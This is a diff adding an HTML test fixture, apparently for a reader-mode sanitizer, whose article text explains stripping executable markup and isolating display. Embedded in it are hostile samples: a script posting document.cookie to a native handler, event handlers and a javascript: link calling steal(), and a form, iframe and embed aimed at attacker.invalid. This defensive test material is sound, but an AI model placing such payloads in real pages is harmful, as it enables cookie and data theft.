@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Safe Handling of Untrusted Markup</title>
+  <style>body { display: none }</style>
+</head>
+<body>
+  <article id="article-body" class="article featured" style="color:red" onclick="steal()">
+    <h1>Safe Handling of Untrusted Markup</h1>
+    <script>window.webkit.messageHandlers.tracker.postMessage(document.cookie)</script>
+    <p onmouseover="steal()">Article markup should be treated as hostile even when it came from a familiar publisher. A compromised advertising system, malformed template, or careless inline handler can carry behavior that does not belong inside a native reader.</p>
+    <form action="https://attacker.invalid/collect"><input name="secret"><button>Send</button></form>
+    <iframe src="https://attacker.invalid/frame"></iframe>
+    <embed src="https://attacker.invalid/plugin">
+    <p>The extraction stage keeps useful structure while removing executable elements and attributes. Paragraphs, headings, figures, quotations, lists, code samples, and tables remain valuable because they express the article rather than the surrounding website interface.</p>
+    <p><a href="javascript:steal()" data-track="yes" style="position:fixed">Unsafe action</a> and <a href="/safe-path" onclick="steal()">a safe relative reference</a> demonstrate that URL schemes and event handlers require separate validation.</p>
+    <figure class="media"><img src="/images/secure-reader.jpg" onerror="steal()" width="900" height="600" alt="A secure reader"><figcaption style="display:none">A useful caption remains visible.</figcaption></figure>
+    <svg onload="steal()"><circle cx="10" cy="10" r="10"></circle></svg>
+    <p>The display stage then places the sanitized fragment inside an application-owned document with a restrictive content policy and JavaScript disabled. This separation ensures the source website never becomes the final interface and cannot regain control after extraction.</p>
+    <blockquote cite="https://example.com/source">Clean content is data, not a continuation of the source page.</blockquote>
+    <p>Defense in depth matters here: allow-list sanitization, protocol checks, an isolated display web view, a nonpersistent data store, and navigation interception each cover a different failure mode.</p>
+  </article>
+</body>
+</html>
